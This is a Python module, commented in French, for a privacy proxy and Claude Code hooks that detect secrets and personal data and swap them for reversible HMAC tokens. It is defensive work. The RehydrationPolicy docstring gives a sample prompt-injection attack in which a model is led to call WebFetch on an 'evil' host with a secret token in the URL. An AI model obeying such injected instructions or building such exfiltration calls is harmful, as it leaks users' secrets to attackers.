"""
Moteur de détection et de pseudonymisation réversible (bibliothèque standard uniquement).

Partagé par :
  - le proxy (proxy/app/main.py) qui pseudonymise les requêtes vers l'API Anthropic
    et ré-identifie les réponses ;
  - les hooks Claude Code (copié dans /opt/claude-governance/hooks par install.sh)
    qui s'en servent pour détecter secrets et PII dans les prompts et les actions.

Principe de la pseudonymisation :
  valeur sensible  ->  PII_<TYPE>_<8 hex>   avec hex = HMAC-SHA256(secret, type|valeur)[:8]

  - déterministe : la même valeur donne toujours le même jeton, d'une requête à l'autre,
    donc l'historique de conversation reste cohérent et le prompt caching fonctionne ;
  - réversible côté proxy uniquement : la table jeton -> valeur reste en local (Redis/mémoire).
"""
from __future__ import annotations

import copy
import hashlib
import hmac
import json
import re
import threading
from collections import Counter, OrderedDict
from dataclasses import dataclass
from fnmatch import fnmatch
from typing import Any, Callable, Iterable, Optional, Protocol

# --------------------------------------------------------------------------------------
# Jetons
# --------------------------------------------------------------------------------------
TOKEN_RE = re.compile(r"(?<![A-Za-z0-9_])PII_([A-Z][A-Z0-9_]*?)_([0-9a-f]{8})(?![0-9a-f])")
# Préfixe possible d'un jeton coupé en fin de chunk de streaming.
_TOKEN_PREFIX_RE = re.compile(r"P(?:I(?:I(?:_[A-Za-z0-9_]{0,48})?)?)?")
HOLDBACK_WINDOW = 64
_TYPE_SANITIZE_RE = re.compile(r"[^A-Z0-9_]")


def holdback_index(buf: str) -> int:
    """Index à partir duquel il faut retenir le texte car il peut s'agir d'un jeton incomplet."""
    n = len(buf)
    i = buf.find("P", max(0, n - HOLDBACK_WINDOW))
    while i != -1:
        if _TOKEN_PREFIX_RE.fullmatch(buf, i):
            return i
        i = buf.find("P", i + 1)
    return n


# --------------------------------------------------------------------------------------
# Validateurs (réduisent les faux positifs des regex)
# --------------------------------------------------------------------------------------
def _digits(s: str) -> str:
    return re.sub(r"\D", "", s)


def luhn_ok(value: str) -> bool:
    d = _digits(value)
    if len(d) < 12 or len(set(d)) == 1:
        return False
    total = 0
    for i, ch in enumerate(reversed(d)):
        n = int(ch)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0


def iban_ok(value: str) -> bool:
    s = re.sub(r"\s", "", value).upper()
    if not re.fullmatch(r"[A-Z]{2}\d{2}[A-Z0-9]{11,30}", s):
        return False
    rearranged = s[4:] + s[:4]
    num = "".join(str(int(c, 36)) for c in rearranged)
    return int(num) % 97 == 1


def nir_ok(value: str) -> bool:
    """Numéro de sécurité sociale français (13 chiffres + clé de contrôle)."""
    s = re.sub(r"\s", "", value).upper()
    if len(s) != 15:
        return False
    body, key = s[:13], s[13:]
    if body[5:7] == "2A":
        body = body[:5] + "19" + body[7:]
    elif body[5:7] == "2B":
        body = body[:5] + "18" + body[7:]
    if not (body.isdigit() and key.isdigit()):
        return False
    return 97 - (int(body) % 97) == int(key)


VALIDATORS: dict[str, Callable[[str], bool]] = {"luhn": luhn_ok, "iban": iban_ok, "nir": nir_ok}


# --------------------------------------------------------------------------------------
# Détection
# --------------------------------------------------------------------------------------
@dataclass(frozen=True)
class Span:
    start: int
    end: int
    type: str
    value: str
    source: str = "regex"
    score: float = 1.0


@dataclass(frozen=True)
class _Rule:
    type: str
    regex: re.Pattern
    group: int
    validator: Optional[Callable[[str], bool]]


NerFn = Callable[[str], list[Span]]


class Detector:
    def __init__(self, pii_policy: dict, ner: Optional[NerFn] = None):
        self.rules: list[_Rule] = []
        for p in pii_policy.get("patterns", []):
            if p.get("enabled", True) is False:
                continue
            validator = VALIDATORS[p["validator"]] if p.get("validator") else None
            self.rules.append(
                _Rule(
                    type=_sanitize_type(p["type"]),
                    regex=re.compile(p["regex"]),
                    group=int(p.get("group", 0)),
                    validator=validator,
                )
            )
        self.allowlist = {a.lower() for a in pii_policy.get("allowlist", [])}
        self.allow_regex = [re.compile(r) for r in pii_policy.get("allowlist_regex", [])]
        self.ner = ner

    def _allowed(self, value: str) -> bool:
        v = value.strip()
        if v.lower() in self.allowlist:
            return True
        return any(r.fullmatch(v) for r in self.allow_regex)

    def detect(self, text: str, use_ner: bool = False) -> list[Span]:
        if not text:
            return []
        found: list[Span] = []
        for rule in self.rules:
            for m in rule.regex.finditer(text):
                value = m.group(rule.group)
                if not value:
                    continue
                if rule.validator and not rule.validator(value):
                    continue
                start, end = m.span(rule.group)
                found.append(Span(start, end, rule.type, value))
        if use_ner and self.ner is not None:
            found.extend(self.ner(text))
        token_spans = [m.span() for m in TOKEN_RE.finditer(text)]
        found = [
            s
            for s in found
            if not self._allowed(s.value)
            and not any(s.start < te and ts < s.end for ts, te in token_spans)
        ]
        return _resolve_overlaps(found)


def terms_patterns(terms: dict) -> list[dict]:
    """Dictionnaire {TYPE: [termes...]} -> motifs de politique (insensibles à la casse,
    mots entiers, espaces souples). Les termes les plus longs sont essayés en premier."""
    out = []
    for type_, values in (terms or {}).items():
        if type_.startswith("_") or not isinstance(values, list):
            continue
        vals = sorted({v.strip() for v in values if isinstance(v, str) and v.strip()}, key=len, reverse=True)
        if not vals:
            continue
        alt = "|".join(r"\s+".join(re.escape(w) for w in v.split()) for v in vals)
        out.append({"type": type_, "regex": rf"(?i)(?<!\w)(?:{alt})(?!\w)"})
    return out


def load_json(path, default):
    """Lit un fichier JSON de configuration. Fichier absent : `default`."""
    try:
        with open(path, encoding="utf-8") as f:
            return json.load(f)
    except FileNotFoundError:
        return default


def load_terms(path) -> dict:
    """Lit le dictionnaire de termes (terms.json, écrit par la console). Absent : vide."""
    return load_json(path, {})


IMAGE_EXTENSIONS = (".png", ".jpg", ".jpeg", ".gif", ".webp")


def apply_overrides(policy: dict, ov: Optional[dict]) -> dict:
    """Applique les réglages de la console (overrides.json) à la politique.

    Réglages reconnus : mask_amounts, allow_images, ner_documents, ner_tool_results, ner_threshold,
    mask_types {TYPE: bool}, allowlist_extra, decisions {clé: ask|deny}, pii_tables,
    web_deny_domains_extra. Les secrets (SECRET_*), les fichiers sensibles, le verrou C3 et le mode
    fail-closed ne sont jamais modifiables ici. Une valeur invalide est ignorée (valeur de policy.json).
    """
    if not ov:
        return policy
    p = copy.deepcopy(policy)
    pii = p.setdefault("pii", {})
    if "mask_amounts" in ov:
        for pat in pii.get("patterns", []):
            if pat.get("type") == "MONTANT":
                pat["enabled"] = bool(ov["mask_amounts"])
    if "allow_images" in ov:
        req = pii.setdefault("request", {})
        tg = p.setdefault("tool_guard", {})
        media = set(req.get("blocked_media", ["pdf", "image"]))
        exts = [e for e in tg.get("read_media_extensions", []) if e not in IMAGE_EXTENSIONS]
        if ov["allow_images"]:
            media.discard("image")
        else:
            media.add("image")
            exts += list(IMAGE_EXTENSIONS)
        req["blocked_media"] = sorted(media)
        tg["read_media_extensions"] = exts
    if "ner_documents" in ov:
        pres = pii.setdefault("presidio", {})
        scopes = [sc for sc in pres.get("scopes", ["user_text"]) if sc != "document"]
        if ov["ner_documents"]:
            scopes.append("document")
        pres["scopes"] = scopes
    if "ner_tool_results" in ov:
        pres = pii.setdefault("presidio", {})
        scopes = [sc for sc in pres.get("scopes", ["user_text"]) if sc != "tool_result"]
        if ov["ner_tool_results"]:
            scopes.append("tool_result")
        pres["scopes"] = scopes
    thr = ov.get("ner_threshold")
    if isinstance(thr, (int, float)) and not isinstance(thr, bool) and 0.3 <= thr <= 0.99:
        pii.setdefault("presidio", {})["score_threshold"] = float(thr)
    types = ov.get("mask_types")
    if isinstance(types, dict):
        for pat in pii.get("patterns", []):
            t = pat.get("type", "")
            if t in MASKABLE_TYPES and isinstance(types.get(t), bool):
                pat["enabled"] = types[t]
    extra = _str_list(ov.get("allowlist_extra"))
    if extra:
        pii["allowlist"] = list(pii.get("allowlist", [])) + extra
    tg = p.setdefault("tool_guard", {})
    decisions = ov.get("decisions")
    if isinstance(decisions, dict):
        for k in DECISION_KEYS:
            if decisions.get(k) in ("ask", "deny"):
                tg[k] = decisions[k]
    if isinstance(ov.get("pii_tables"), list):
        tg["pii_tables"] = _str_list(ov["pii_tables"])
    domains = _str_list(ov.get("web_deny_domains_extra"))
    if domains:
        tg["web_deny_domains"] = list(tg.get("web_deny_domains", [])) + domains
    return p


# Types de données masquables ou non depuis la console (jamais les secrets SECRET_*, ni MONTANT : mask_amounts).
MASKABLE_TYPES = ("EMAIL", "PHONE_FR", "IBAN", "CREDIT_CARD", "NIR", "SIRET", "IPV4")
# Décisions des hooks réglables entre « demander » (ask) et « refuser » (deny).
DECISION_KEYS = ("bash_network_pii_decision", "pii_tables_decision", "write_secret_decision")


def _str_list(v) -> list[str]:
    return [x.strip() for x in v if isinstance(x, str) and x.strip()] if isinstance(v, list) else []


def with_terms(pii_policy: dict, terms: dict) -> dict:
    """Politique PII enrichie des termes du dictionnaire (placés avant les autres motifs)."""
    return {**pii_policy, "patterns": terms_patterns(terms) + list(pii_policy.get("patterns", []))}


def _sanitize_type(t: str) -> str:
    t = _TYPE_SANITIZE_RE.sub("_", t.upper()).strip("_") or "PII"
    return t if t[0].isalpha() else "X" + t


def _resolve_overlaps(spans: list[Span]) -> list[Span]:
    # Un secret trouvé par regex n'est jamais absorbé par une entité NER plus longue (qui le
    # typerait LOCATION et le rendrait aux outils Bash/MCP au lieu de le garder masqué).
    secrets = [s for s in spans if s.source == "regex" and s.type.startswith("SECRET_")]
    spans = [s for s in spans if s.source == "regex"
             or not any(s.start < x.end and x.start < s.end for x in secrets)]
    # Tri stable : début, puis le plus long ; à égalité, la regex (ordre de la politique) prime sur le NER.
    ordered = sorted(spans, key=lambda s: (s.start, -(s.end - s.start), s.source != "regex"))
    kept: list[Span] = []
    last_end = -1
    for s in ordered:
        if s.start >= last_end:
            kept.append(s)
            last_end = s.end
    return kept


# --------------------------------------------------------------------------------------
# Table de correspondance jeton -> valeur
# --------------------------------------------------------------------------------------
class MappingStore(Protocol):
    def put(self, token: str, value: str) -> None: ...
    def get(self, token: str) -> Optional[str]: ...


class MemoryStore:
    def __init__(self, max_items: int = 200_000):
        self._d: "OrderedDict[str, str]" = OrderedDict()
        self._max = max_items
        self._lock = threading.Lock()

    def put(self, token: str, value: str) -> None:
        with self._lock:
            self._d[token] = value
            self._d.move_to_end(token)
            while len(self._d) > self._max:
                self._d.popitem(last=False)

    def get(self, token: str) -> Optional[str]:
        with self._lock:
            return self._d.get(token)

    def __contains__(self, token: str) -> bool:
        with self._lock:
            return token in self._d


class KnownValues:
    """Valeurs détectées par le NER, re-masquées partout où elles réapparaissent.

    Le NER ne voit pas tout (scopes, contexte). Or le proxy restitue les vraies valeurs dans les
    réponses : Claude Code les garde dans l'historique et les renvoie au tour suivant, par exemple
    dans le texte de l'assistant, où le NER ne s'applique pas. Une valeur déjà identifiée comme
    nom de personne est donc remplacée de façon déterministe, où qu'elle apparaisse.
    """

    def __init__(self, max_items: int = 10_000):
        self._d: "OrderedDict[str, str]" = OrderedDict()  # valeur -> type
        self._max = max_items
        self._lock = threading.Lock()
        self._re: Optional[re.Pattern] = None
        self.version = 0

    def add(self, value: str, type_: str) -> None:
        value = value.strip()
        if len(value) < 3:
            return
        with self._lock:
            if self._d.get(value) == type_:
                self._d.move_to_end(value)
                return
            self._d[value] = type_
            while len(self._d) > self._max:
                self._d.popitem(last=False)
            self._re = None
            self.version += 1

    def spans(self, text: str) -> list[Span]:
        with self._lock:
            if not self._d:
                return []
            if self._re is None:
                alt = "|".join(re.escape(v) for v in sorted(self._d, key=len, reverse=True))
                self._re = re.compile(rf"(?<!\w)(?:{alt})(?!\w)")
            rx, types = self._re, dict(self._d)
        return [Span(m.start(), m.end(), types[m.group(0)], m.group(0), "known") for m in rx.finditer(text)]


# --------------------------------------------------------------------------------------
# Pseudonymisation
# --------------------------------------------------------------------------------------
class Pseudonymizer:
    def __init__(self, detector: Detector, secret: bytes, store: Optional[MappingStore] = None,
                 cache_size: int = 4096, known: Optional[KnownValues] = None):
        if len(secret) < 16:
            raise ValueError("Le secret de pseudonymisation doit faire au moins 16 octets")
        self.detector = detector
        self.secret = secret
        self.store: MappingStore = store if store is not None else MemoryStore()
        self.known = known if known is not None else KnownValues()
        self._cache: "OrderedDict[tuple[bool, str], tuple[str, tuple[tuple[str, Span], ...]]]" = OrderedDict()
        self._cache_size = cache_size
        self._lock = threading.Lock()

    def token_for(self, type_: str, value: str) -> str:
        digest = hmac.new(self.secret, f"{type_}\x00{value}".encode(), hashlib.sha256).hexdigest()[:8]
        return f"PII_{type_}_{digest}"

    def pseudonymize(self, text: str, use_ner: bool = False) -> tuple[str, list[Span]]:
        if not text:
            return text, []
        key = (use_ner, self.known.version, hashlib.sha256(text.encode()).hexdigest())
        with self._lock:
            hit = self._cache.get(key)
            if hit is not None:
                self._cache.move_to_end(key)
        if hit is not None:
            out, pairs = hit
            for tok, span in pairs:  # la table a pu expirer : on la ré-alimente
                self.store.put(tok, span.value)
            return out, [s for _, s in pairs]

        spans = self.detector.detect(text, use_ner=use_ner)
        for s in spans:
            if s.source == "presidio":
                self.known.add(s.value, s.type)
        known = [k for k in self.known.spans(text)
                 if not any(k.start < s.end and s.start < k.end for s in spans)]
        if known:
            spans = _resolve_overlaps(spans + known)
        parts: list[str] = []
        pairs: list[tuple[str, Span]] = []
        pos = 0
        for s in spans:
            tok = self.token_for(s.type, s.value)
            self.store.put(tok, s.value)
            parts.append(text[pos:s.start])
            parts.append(tok)
            pairs.append((tok, s))
            pos = s.end
        parts.append(text[pos:])
        out = "".join(parts)
        with self._lock:
            self._cache[key] = (out, tuple(pairs))
            while len(self._cache) > self._cache_size:
                self._cache.popitem(last=False)
        return out, spans

    def rehydrate(self, text: str, json_escape: bool = False,
                  allow: Optional[Callable[[str], bool]] = None) -> str:
        """Remplace les jetons par leur valeur. `allow(type)` False : jeton laissé tel quel."""
        if not text or "PII_" not in text:
            return text

        def repl(m: re.Match) -> str:
            if allow is not None and not allow(m.group(1)):
                return m.group(0)
            value = self.store.get(m.group(0))
            if value is None:
                return m.group(0)  # jeton inconnu (halluciné ou expiré) : laissé tel quel
            return json.dumps(value, ensure_ascii=False)[1:-1] if json_escape else value

        return TOKEN_RE.sub(repl, text)


# --------------------------------------------------------------------------------------
# Restrictions de ré-identification (anti-exfiltration)
# --------------------------------------------------------------------------------------
class RehydrationPolicy:
    """Quels jetons restituer, selon l'outil qui va recevoir la valeur.

    Sans restriction, une injection de prompt pourrait faire produire au modèle
    WebFetch("https://evil/?d=PII_SECRET_…") : le proxy y mettrait la vraie valeur
    avant que Claude Code n'exécute l'outil.

      - texte de réponse : tout est restitué (il reste sur le poste) ;
      - outils de `blocked_tools` (WebFetch, WebSearch) : rien n'est restitué ;
      - secrets (`secret_types`) : restitués uniquement dans les outils d'écriture de
        fichiers (`secret_tools`), pour ne pas détruire un fichier de config réécrit ;
      - autres outils (Bash, MCP...) : tout sauf les secrets.
    """

    def __init__(self, cfg: Optional[dict] = None):
        cfg = cfg or {}
        self.blocked_tools = set(cfg.get("blocked_tools", ["WebFetch", "WebSearch"]))
        self.secret_types = list(cfg.get("secret_types", ["SECRET_*"]))
        self.secret_tools = set(cfg.get("secret_tools", ["Write", "Edit", "MultiEdit", "NotebookEdit"]))

    def is_secret(self, type_: str) -> bool:
        return any(fnmatch(type_, p) for p in self.secret_types)

    def allow_for(self, tool: Optional[str]) -> Optional[Callable[[str], bool]]:
        """Filtre de types pour un bloc ; tool=None désigne un bloc texte."""
        if tool is None or tool in self.secret_tools:
            return None
        if tool in self.blocked_tools:
            return lambda _t: False
        return lambda t: not self.is_secret(t)


# --------------------------------------------------------------------------------------
# Parcours des corps de requête / réponse de l'API Messages
# --------------------------------------------------------------------------------------
def _map_strings(obj: Any, fn: Callable[[str], str]) -> Any:
    if isinstance(obj, str):
        return fn(obj)
    if isinstance(obj, list):
        return [_map_strings(x, fn) for x in obj]
    if isinstance(obj, dict):
        return {k: _map_strings(v, fn) for k, v in obj.items()}
    return obj


@dataclass
class RequestOptions:
    """Options de parcours d'une requête (section pii.request de la politique).

    blocked_media       : "pdf" / "image" -> blocs binaires remplacés par un avis texte
                          (le proxy ne sait pseudonymiser que du texte) ;
    document_commands   : regex sur les commandes Bash qui extraient un document
                          (pdftotext...) : leur sortie est traitée en scope "document" ;
    document_extensions : idem pour les fichiers texte lus par Read (.md, .txt...) ;
    document_workspace  : regex sur le contexte de session (prompt système, premier message) :
                          si le répertoire de travail correspond (ex. ~/clients/), TOUTES les
                          sorties d'outils sont traitées en scope "document".
    """
    blocked_media: frozenset = frozenset({"pdf", "image"})
    document_commands: Optional[re.Pattern] = None
    document_extensions: tuple = ()
    document_workspace: Optional[re.Pattern] = None

    @classmethod
    def from_policy(cls, cfg: Optional[dict]) -> "RequestOptions":
        cfg = cfg or {}
        cmd = cfg.get("document_commands")
        ws = cfg.get("document_workspace")
        return cls(
            blocked_media=frozenset(cfg.get("blocked_media", ["pdf", "image"])),
            document_commands=re.compile(cmd) if cmd else None,
            document_extensions=tuple(e.lower() for e in cfg.get("document_extensions", [])),
            document_workspace=re.compile(ws) if ws else None,
        )


_MEDIA_NOTICE = {
    "pdf": "[Gouvernance] PDF retiré avant envoi (le proxy ne pseudonymise que du texte). "
           "Lisez-le en texte : pdftotext -layout <fichier> -",
    "image": "[Gouvernance] Image retirée avant envoi (le proxy ne pseudonymise que du texte).",
}


def _media_kind(block: dict) -> Optional[str]:
    """'pdf' / 'image' pour un bloc binaire, None pour du texte."""
    t = block.get("type")
    src = block.get("source") if isinstance(block.get("source"), dict) else {}
    if t == "image":
        return "image"
    if t == "document" and src.get("type") != "text":
        mt = str(src.get("media_type", ""))
        return "image" if mt.startswith("image/") else "pdf"
    return None


def _strip_media(block: dict, opts: RequestOptions, scope: str, stats: Counter) -> bool:
    kind = _media_kind(block)
    if kind is None or kind not in opts.blocked_media:
        return False
    keep = {k: block[k] for k in ("cache_control",) if k in block}
    block.clear()
    block.update({"type": "text", "text": _MEDIA_NOTICE[kind], **keep})
    stats[(f"MEDIA_{kind.upper()}", scope)] += 1
    return True


def _is_document_tool(tool: Optional[dict], opts: RequestOptions) -> bool:
    if not tool:
        return False
    tin = tool.get("input") if isinstance(tool.get("input"), dict) else {}
    if tool.get("name") == "Bash" and opts.document_commands is not None:
        return bool(opts.document_commands.search(str(tin.get("command", ""))))
    if tool.get("name") == "Read" and opts.document_extensions:
        return str(tin.get("file_path", "")).lower().endswith(opts.document_extensions)
    return False


def _texts(content: Any) -> list[str]:
    if isinstance(content, str):
        return [content]
    if isinstance(content, list):
        return [b.get("text", "") for b in content if isinstance(b, dict) and b.get("type") == "text"]
    return []


def _session_context(system: Any, messages: list) -> str:
    """Texte où Claude Code décrit la session (répertoire de travail) : prompt système, messages
    de rôle "system" (versions récentes de Claude Code) et premier message utilisateur."""
    parts = _texts(system)
    for i, m in enumerate(messages):
        if m.get("role") == "system" or i == 0:
            parts += _texts(m.get("content"))
    return "\n".join(p for p in parts if isinstance(p, str))


def pseudonymize_request(body: dict, p: Pseudonymizer, ner_scopes: Iterable[str] = (),
                         opts: Optional[RequestOptions] = None) -> Counter:
    """Pseudonymise en place un corps /v1/messages. Retourne Counter[(type, scope)].

    Scopes : system, user_text, assistant, tool_result, tool_input, document.
    "document" couvre les blocs document texte et les sorties d'outils qui extraient
    un document (pdftotext...), pour leur appliquer le NER sans l'appliquer au code.
    Les blocs thinking / redacted_thinking ne sont jamais modifiés (leur signature
    serait invalidée) ; ils ne contiennent de toute façon que des jetons, puisque le
    modèle n'a jamais vu les valeurs réelles.
    """
    ner_scopes = set(ner_scopes)
    opts = opts or RequestOptions()
    stats: Counter = Counter()

    def do(text: str, scope: str) -> str:
        if not isinstance(text, str):
            return text
        out, spans = p.pseudonymize(text, use_ner=scope in ner_scopes)
        for s in spans:
            stats[(s.type, scope)] += 1
        return out

    system = copy.deepcopy(body.get("system"))
    if isinstance(system, str):
        body["system"] = do(system, "system")
    elif isinstance(body.get("system"), list):
        for b in body["system"]:
            if isinstance(b, dict) and b.get("type") == "text":
                b["text"] = do(b.get("text", ""), "system")

    messages = [m for m in body.get("messages", []) or [] if isinstance(m, dict)]
    # Session ouverte dans un dossier de documents (ex. ~/clients/) : NER sur toutes les sorties
    # d'outils. Évalué sur le texte d'origine, avant pseudonymisation.
    in_workspace = opts.document_workspace is not None and bool(
        opts.document_workspace.search(_session_context(system, messages)))
    # tool_use_id -> bloc tool_use, pour savoir quel outil a produit chaque tool_result
    tools = {b.get("id"): b for m in messages if isinstance(m.get("content"), list)
             for b in m["content"] if isinstance(b, dict) and b.get("type") == "tool_use"}

    for msg in messages:
        text_scope = {"user": "user_text", "system": "system"}.get(msg.get("role"), "assistant")
        content = msg.get("content")
        if isinstance(content, str):
            msg["content"] = do(content, text_scope)
            continue
        if not isinstance(content, list):
            continue
        for block in content:
            if not isinstance(block, dict) or _strip_media(block, opts, text_scope, stats):
                continue
            t = block.get("type")
            if t == "text":
                block["text"] = do(block.get("text", ""), text_scope)
            elif t == "tool_result":
                scope = "document" if in_workspace or \
                    _is_document_tool(tools.get(block.get("tool_use_id")), opts) else "tool_result"
                c = block.get("content")
                if isinstance(c, str):
                    block["content"] = do(c, scope)
                elif isinstance(c, list):
                    for sub in c:
                        if not isinstance(sub, dict) or _strip_media(sub, opts, scope, stats):
                            continue
                        if sub.get("type") == "text":
                            sub["text"] = do(sub.get("text", ""), scope)
            elif t == "tool_use":
                block["input"] = _map_strings(block.get("input"), lambda s: do(s, "tool_input"))
            elif t == "document":
                src = block.get("source")
                if isinstance(src, dict) and src.get("type") == "text":
                    src["data"] = do(src.get("data", ""), "document")
            # thinking, redacted_thinking, etc. : inchangés
    return stats


def rehydrate_response(body: dict, p: Pseudonymizer, policy: Optional[RehydrationPolicy] = None) -> None:
    """Ré-identifie en place une réponse /v1/messages non streamée."""
    policy = policy or RehydrationPolicy()
    for block in body.get("content", []) or []:
        if not isinstance(block, dict):
            continue
        t = block.get("type")
        if t == "text":
            block["text"] = p.rehydrate(block.get("text", ""))
        elif t == "tool_use":
            allow = policy.allow_for(block.get("name") or "")
            block["input"] = _map_strings(block.get("input"), lambda x: p.rehydrate(x, allow=allow))
